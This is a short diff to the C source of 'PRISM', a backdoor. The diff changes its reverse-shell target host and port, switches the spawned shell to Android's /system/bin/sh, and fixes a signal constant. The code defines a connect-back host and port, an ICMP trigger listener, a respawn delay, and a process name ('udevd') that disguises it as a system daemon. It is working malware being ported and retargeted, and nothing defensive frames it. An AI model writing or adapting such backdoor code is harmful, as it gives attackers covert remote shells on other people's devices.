@@ -38,8 +38,8 @@
 #include <signal.h>
 
 #ifdef STATIC
-# define REVERSE_HOST     "10.0.0.1"
-# define REVERSE_PORT     19832
+# define REVERSE_HOST     "192.168.1.64"
+# define REVERSE_PORT     4001
 # define RESPAWN_DELAY    15
 #else
 # define ICMP_PACKET_SIZE 1024
@@ -48,7 +48,7 @@
 
 #define VERSION          "0.5"
 #define MOTD             "PRISM v"VERSION" started\n\n# "
-#define SHELL            "/bin/sh"
+#define SHELL            "/system/bin/sh"
 #define PROCESS_NAME     "udevd"
 
 /*
@@ -171,7 +171,7 @@ void icmp_listen(void)
  */
 int main(int argc, char *argv[])
 {  
-    signal(SIGCLD, SIG_IGN); //Prevent child process from becoming zombie process
+    signal(SIGCHLD, SIG_IGN); //Prevent child process from becoming zombie process
     chdir("/");
 
     /* If argv is equal to Inf0, some info will be printed 
